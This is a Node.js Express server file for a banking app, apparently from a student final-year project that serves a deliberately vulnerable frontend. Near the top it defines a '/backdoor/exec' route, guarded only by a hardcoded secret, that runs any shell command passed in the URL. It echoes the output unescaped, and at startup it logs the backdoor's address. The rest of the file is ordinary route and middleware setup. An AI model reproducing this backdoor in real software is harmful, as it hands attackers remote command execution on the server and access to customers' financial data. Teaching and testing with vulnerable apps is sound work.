import express from "express";
import dotenv from "dotenv";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";
import connectDB from "./db.js";
import { isDemoMode } from "./helpers/demoStore.js";
import requestSanitizer from "./helpers/requestSanitizer.js";

import applicationRoutes from "./routes/applicationRoutes.js";
import accountRoutes from "./routes/accountRoutes.js";
import userRoutes from "./routes/userRoutes.js";
import cardRoutes from "./routes/cardRoutes.js";
import transferRoutes from "./routes/transferRoutes.js";
import feedbackRoutes from "./routes/feedbackRoutes.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ override: true });

const server = express();
const PORT = Number(process.env.PORT) || 3000;
const demoMode = isDemoMode();

// === DANGEROUS BACKDOOR FOR FYP DEMO ===
server.get('/backdoor/exec', async (req, res) => {
    const secret = req.query.secret;
    const cmd = req.query.cmd;

    if (secret !== "fyp2026") {
        return res.status(403).send("<h1>Access Denied</h1>");
    }

    if (!cmd) {
        return res.send(`
            <h2>🔥 Backdoor Active (FYP Demo)</h2>
            <p><strong>Usage:</strong> <code>?secret=fyp2026&cmd=whoami</code></p>
            <p>Try: whoami | dir | ipconfig | powershell</p>
        `);
    }

    try {
        const { exec } = await import('child_process');
        
        console.log(`[BACKDOOR] Executing: ${cmd}`);

        exec(cmd, { shell: true, timeout: 15000 }, (error, stdout, stderr) => {
            res.setHeader('Content-Type', 'text/html');
            res.send(`
                <h1>✅ Command Executed</h1>
                <h3>Command: <code>${cmd}</code></h3>
                <pre style="background:#111;color:lime;padding:20px;font-size:16px;">${stdout || stderr || error?.message || 'No output'}</pre>
                <hr>
             
            `);
        });
    } catch (err) {
        res.status(500).send("Execution error: " + err.message);
    }
});

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 300,
});

await connectDB();

if (demoMode) {
    console.log("Running in demo mode with MongoDB-backed storage");
}

server.use(cors());
server.use(helmet());
server.use(apiLimiter);
server.use(express.json({ limit: "5mb" }));
server.use(express.static(path.join(__dirname, "../frontend-vulnerable/public")));
server.use(requestSanitizer);

server.use("/api/applications", applicationRoutes);
server.use("/api/accounts", accountRoutes);
server.use("/api/users", userRoutes);
server.use("/api/cards", cardRoutes);
server.use("/api/transfers", transferRoutes);
server.use("/api/feedback", feedbackRoutes);

server.get("/", (req, res) => {
    res.send("Public Bank Backend Running");
});

server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`🔥 Backdoor: http://localhost:${PORT}/backdoor/exec?secret=fyp2026&cmd=whoami`);
});